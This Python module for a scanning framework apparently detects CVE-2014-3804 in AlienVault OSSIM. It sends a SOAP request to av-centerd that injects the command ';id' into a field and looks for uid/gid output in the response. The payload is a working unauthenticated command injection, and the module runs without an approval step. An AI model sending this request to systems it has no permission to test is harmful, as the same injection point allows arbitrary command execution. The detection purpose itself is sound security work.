#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AlienVault OSSIM av-centerd SOAP RCE (CVE-2014-3804)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AlienVault OSSIM - av-centerd SOAP RCE Detection (CVE-2014-3804)',
        'description': (
            'Detects CVE-2014-3804 by POSTing update_system_info_debian_package SOAP '
            'with injected ;id to av-centerd (default port 40007).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'ossim', 'alienvault', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-3804',
        ],
        'cve': 'CVE-2014-3804',
    }

    port = OptPort(40007, 'av-centerd HTTP port', True)

    def run(self):
        soap = (
            "<soap:Envelope soap:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/' "
            "xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' "
            "xmlns:soapenc='http://schemas.xmlsoap.org/soap/encoding/' "
            "xmlns:xsd='http://www.w3.org/2001/XMLSchema' "
            "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>"
            "<soap:Body><update_system_info_debian_package xmlns='AV/CC/Util'>"
            "<c-gensym3 xsi:type='xsd:string'>VTTest</c-gensym3>"
            "<c-gensym5 xsi:type='xsd:string'>VTTest</c-gensym5>"
            "<c-gensym7 xsi:type='xsd:string'>VTTest</c-gensym7>"
            "<c-gensym9 xsi:type='xsd:string'>VTTest</c-gensym9>"
            "<c-gensym11 xsi:type='xsd:string'>;id</c-gensym11>"
            "</update_system_info_debian_package></soap:Body></soap:Envelope>"
        )
        r = self.http_request(
            method='POST',
            path='/av-centerd',
            data=soap,
            headers={
                'SOAPAction': '"AV/CC/Util#update_system_info_debian_package"',
                'Content-Type': 'text/xml; charset=UTF-8',
            },
            allow_redirects=False,
        )
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='OSSIM av-centerd SOAP RCE (CVE-2014-3804)',
                path='/av-centerd',
            )
            return True
        return False
